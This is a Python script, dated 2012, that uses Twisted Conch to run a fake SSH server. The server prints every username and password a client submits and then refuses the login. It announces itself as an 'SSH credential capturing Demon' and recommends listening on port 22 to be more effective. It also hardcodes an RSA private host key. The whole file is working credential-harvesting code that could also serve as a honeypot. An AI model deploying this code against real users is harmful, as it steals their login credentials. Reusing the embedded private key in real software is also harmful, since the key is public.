#!/usr/bin/env python

#Thanks for Twisted Matrix Laboratories for Ninja SSH server.
# The code below uses http://twistedmatrix.com/documents/current/conch/Ninjas/ heavily.

#Writen by moj0e July, 2012

from twisted.cred import portal, checkers, credentials
from twisted.conch import avatar
from twisted.conch.checkers import ICredentialsChecker, IUsernamePassword
from twisted.conch.ssh import factory, userauth, connection, keys, session
from twisted.internet import reactor, protocol, defer
from twisted.python import failure
from zope.interface import implements
import sys
 

class NinjaAvatar(avatar.ConchUser):

    def __init__(self, username):
        avatar.ConchUser.__init__(self)
        self.username = username
        self.channelLookup.update({'session':session.SSHSession})

class NinjaRealm:
    implements(portal.IRealm)

    def requestAvatar(self, avatarId, mind, *interfaces):
        return interfaces[0], NinjaAvatar(avatarId), lambda: None

publicKey = 'ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAGEArzJx8OYOnJmzf4tfBEvLi8DVPrJ3/c9k2I/Az64fxjHf9imyRJbixtQhlH9lfNjUIx+4LmrJH5QNRsFporcHDKOTwTTYLh5KmRpslkYHRivcJSkbh/C+BR3utDS555mV'

privateKey = """-----BEGIN RSA PRIVATE KEY-----
MIIByAIBAAJhAK8ycfDmDpyZs3+LXwRLy4vA1T6yd/3PZNiPwM+uH8Yx3/YpskSW
4sbUIZR/ZXzY1CMfuC5qyR+UDUbBaaK3Bwyjk8E02C4eSpkabJZGB0Yr3CUpG4fw
vgUd7rQ0ueeZlQIBIwJgbh+1VZfr7WftK5lu7MHtqE1S1vPWZQYE3+VUn8yJADyb
Z4fsZaCrzW9lkIqXkE3GIY+ojdhZhkO1gbG0118sIgphwSWKRxK0mvh6ERxKqIt1
xJEJO74EykXZV4oNJ8sjAjEA3J9r2ZghVhGN6V8DnQrTk24Td0E8hU8AcP0FVP+8
PQm/g/aXf2QQkQT+omdHVEJrAjEAy0pL0EBH6EVS98evDCBtQw22OZT52qXlAwZ2
gyTriKFVoqjeEjt3SZKKqXHSApP/AjBLpF99zcJJZRq2abgYlf9lv1chkrWqDHUu
DZttmYJeEfiFBBavVYIF1dOlZT0G8jMCMBc7sOSZodFnAiryP+Qg9otSBjJ3bQML
pSTqy7c3a2AScC/YyOwkDaICHnnD3XyjMwIxALRzl0tQEKMXs6hH8ToUdlLROCrP
EhQ0wahUTCk1gKA4uPD6TMTChavbh4K63OvbKg==
-----END RSA PRIVATE KEY-----"""
 

class AlwaysDenyPasswordChecker:
    #credentialInterfaces = checkers.IUsernamePassword,
    implements(ICredentialsChecker)
    credentialInterfaces = (credentials.IUsernamePassword, credentials.IUsernameHashedPassword )

    def __init__(self, **users):
      self.users = users

    def requestAvatarId(self, credentials):
        print 'Found username/password of "'+ credentials.username +'" "'+ credentials.password + '"'
        #print 'Found password: "'+ credentials.password + '"'
        #print '---------------------------------------------'
        return failure.Failure(Exception("Bad credentials"))

class NinjaSession:
    def __init__(self):
         print "Hello NinjaSession"
    
    def __init__(self, avatar):
        print 'In NinjaSession'
        """
        We don't use it, but the adapter is passed the avatar as its first
        argument.
        """

    def getPty(self, term, windowSize, attrs):
        pass
    
    def execCommand(self, proto, cmd):
        print "This should never happen"
        raise Exception("no executing commands")

    def openShell(self, trans):
        pass

    def eofReceived(self):
        pass

    def closed(self):
        pass

from twisted.python import components
components.registerAdapter(NinjaSession, NinjaAvatar, session.ISession)

class NinjaFactory(factory.SSHFactory):
        
    publicKeys = {
        'ssh-rsa': keys.Key.fromString(data=publicKey)
    }
    privateKeys = {
        'ssh-rsa': keys.Key.fromString(data=privateKey)
    }
    services = {
        'ssh-userauth': userauth.SSHUserAuthServer,
        'ssh-connection': connection.SSHConnection
    }
    

portal = portal.Portal(NinjaRealm())
passwdDB = AlwaysDenyPasswordChecker()
portal.registerChecker(passwdDB)
NinjaFactory.portal = portal

if __name__ == '__main__':
    port  = 5022
    print "Starting SSH credential capturing Demon!"
    print "Listening on port:", port
    if port != 22:
      print "Note: This would probably be more effective if you ran it on port 22.... just saying."
      print
    reactor.listenTCP(port, NinjaFactory())
    reactor.run()
